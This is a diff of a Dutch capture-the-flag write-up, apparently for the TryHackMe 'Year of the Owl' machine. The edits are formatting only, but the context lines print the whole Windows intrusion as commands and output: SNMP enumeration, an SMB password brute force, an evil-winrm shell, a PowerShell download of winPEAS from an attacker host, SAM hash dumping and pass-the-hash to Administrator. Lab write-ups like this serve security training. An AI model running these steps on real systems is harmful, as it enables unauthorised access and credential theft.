@@ -18,7 +18,7 @@ toc-own-page: true
 
 Ik begin met een poortscan voor informatie hieromtrent.
 
-```console
+```shell
 nmap -sS $ip
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 02:39 EDT
 Nmap scan report for 10.10.179.45
@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.42 seconds
 Van de output hierboven kom ik tot de conclusie dat we te maken hebben met een windows machine waar een webserver op draait:
 
 
-![](./screenie.png)
+![](./Images/screenie.png)
 
 ## Directory enumeration
 
@@ -89,7 +89,7 @@ De scan bracht geen nuttige resultaten op, dus ga ik over tot een andere service
 
 Een andere optie is om via SMB verbinding te maken met de server, maar dit vereist credentials voor aangezien anonieme logins geen succes opleverden.
 
-```console
+```shell
 smbclient -L //10.10.179.45/ -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 ```
@@ -99,7 +99,7 @@ Voorlopig kan ik niet verder met SMB, maar hier kan ik nog wel op terugkomen moc
 
 Ik herscan de machine nadat ik vaststelde dat de target beveiligd is tegen de veelvoorkomende vulnerabilities. Echter filter ik nu slechts enkel UDP poorten.
 
-```console
+```shell
 nmap -sU --top-ports 10 $ip
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 00:29 EDT
 Nmap scan report for 10.10.179.45
@@ -123,7 +123,7 @@ Merk op dat poort 161 (SNMP) openstaat. SNMP is een protocol dat netwerkinformat
 
 Onesixtytwo is een tool in Kali dat scant naar vertrouwelijke informatie.
 
-```console
+```shell
 onesixtyone $ip -c /usr/share/doc/onesixtyone/dict.txt            
 Scanning 1 hosts, 51 communities
 10.10.179.45 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software:
@@ -131,7 +131,7 @@ Windows Version 6.3 (Build 17763 Multiprocessor Free)
 ```
 De commmunity string blijkt public te zijn. Dat betekent dat we een check kunnen uitvoeren op netwerkgerelateerde informatie.
 
-```console
+```shell
 snmp-check -c openview $ip     
 snmp-check v1.9 - SNMP enumerator
 Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
@@ -168,7 +168,7 @@ SMB vereist een gebruikersnaam en een wachtwoord, waardoor we deze moeten brute-
 
 Hiervoor gebruik crackmapexec dat door alle records van het .txt-bestand rockyou loopt.
 
-```console
+```shell
 crackmapexec smb $ip -u Jareth -p /home/kali/Desktop/rockyou.txt
 
 SMB         10.10.179.45    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:natalie STATUS_LOGON_FAILURE 
@@ -181,7 +181,7 @@ SMB         10.10.179.45    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:s
 Het wachtwoord van Jareth blijkt sarah te zijn. Nu kan ik de SMB-shares opvragen.
 
 
-```console
+```shell
 smbclient -L //$ip -U Jareth    
 Enter WORKGROUP\Jareth's password: 
 
@@ -195,7 +195,7 @@ SMB1 disabled -- no workgroup available
 
 Ik weet dat de poort voor WinRM openstaat, dus kan ik hier mijn exploit op uitvoeren.
 
-```console
+```shell
 bundle exec evil-winrm.rb -i 10.10.179.45 -u Jareth -p 'sarah'
 
 Evil-WinRM shell v2.4
@@ -210,7 +210,7 @@ Nu hoef ik enkel nog mijn privileges te escalaten naar Administrators-niveau.
 # Administrator Privilege Escalation
 
 
-```console
+```shell
 PS C:\Users\Jareth\Documents> (New-Object System.Net.WebClient).DownloadFile("http://attackIP/winPEAS.bat",
 "C:\users\jareth\documents\winPEAS.bat")
 .\winPEAS.bat
@@ -218,7 +218,7 @@ PS C:\Users\Jareth\Documents> (New-Object System.Net.WebClient).DownloadFile("ht
 
 Het script gaf enkele suggesties voor mogelijke locaties waar credentials stonden, omzeilingstechnieken, ... Het raadde ook aan om te kijken in de prullenbak voor credential files.
 
-```console
+```shell
 USER INFORMATION
 ----------------
 
@@ -229,7 +229,7 @@ year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
 
 Het blijkt dat er een backup van het systeem aanwezig is en de SAM-database.
 
-```console
+```shell
 *Evil-WinRM* PS C:\Users\Jareth\Documents> cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
 *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir
 
@@ -246,7 +246,7 @@ Mode                LastWriteTime         Length Name
 Deze bestanden moet ik in een tempfolder zetten op C: niveau zodat mijn machine de bestanden kan downloaden.
 
 
-```console
+```shell
 *Evil-WinRM* PS C:\temp> Write-Host((Get-Item system.bak).length/1KB)
 17048
 *Evil-WinRM* PS C:\temp> Write-Host((Get-Item sam.bak).length/1KB)
@@ -275,7 +275,7 @@ total 17460
 
 Nu kan ik de bestanden kraken met een python-script.
 
-```console
+```shell
 python3 secretsdump.py -sam sam.bak -system system.bak LOCAL >> hash.txt                     
                                                                                                               
 ┌──(root💀kali)-[~/nishang/Shells/Year_Of_Owl_THM]
@@ -294,7 +294,7 @@ Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
 
 Doordat we de hashes hebben gekraakt, kan ik inloggen op het Administratorsaccount m.b.v. de hash.
 
-```console
+```shell
 bundle exec evil-winrm.rb -i 10.10.179.45 -u Administrator -H 
 '6bc99ede9edcfecf9662fb0c0ddcfa7a'
 
